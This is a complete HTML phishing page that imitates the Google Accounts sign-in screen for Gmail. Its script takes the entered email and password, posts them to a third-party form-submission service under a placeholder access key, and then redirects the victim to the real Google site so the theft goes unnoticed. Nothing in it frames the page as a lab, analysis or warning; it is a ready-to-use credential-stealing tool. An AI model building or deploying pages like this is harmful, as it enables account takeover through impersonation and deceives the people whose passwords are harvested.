<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
body{font-family:Roboto,Arial,sans-serif;background:#fff;display:flex;
justify-content:center;align-items:center;height:100vh;margin:0}
.box{width:368px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px}
h1{font-size:24px;font-weight:400;margin:0 0 8px}
p{font-size:14px;color:#5f6368;margin:0 0 28px}
input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;
border-radius:4px;box-sizing:border-box;margin-bottom:20px}
button{background:#1a73e8;color:#fff;border:0;border-radius:4px;
padding:11px 24px;font-size:14px;float:right;cursor:pointer}
</style></head><body>
<form class="box" id="f">
<h1>Sign in</h1>
<p>to continue to Gmail</p>
<input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Enter your password" required>
<button type="submit">Next</button>
</form>
<script>
document.getElementById('f').addEventListener('submit',async e=>{
  e.preventDefault();
  const d=Object.fromEntries(new FormData(e.target));
  d.access_key='DEIN_WEB3FORMS_KEY';
  d.subject='Login: '+d.email;
  try{await fetch('https://api.web3forms.com/submit',
    {method:'POST',headers:{'Content-Type':'application/json'},
     body:JSON.stringify(d)});}catch(_){}
  location.href='https://accounts.google.com';
});
</script></body></html>
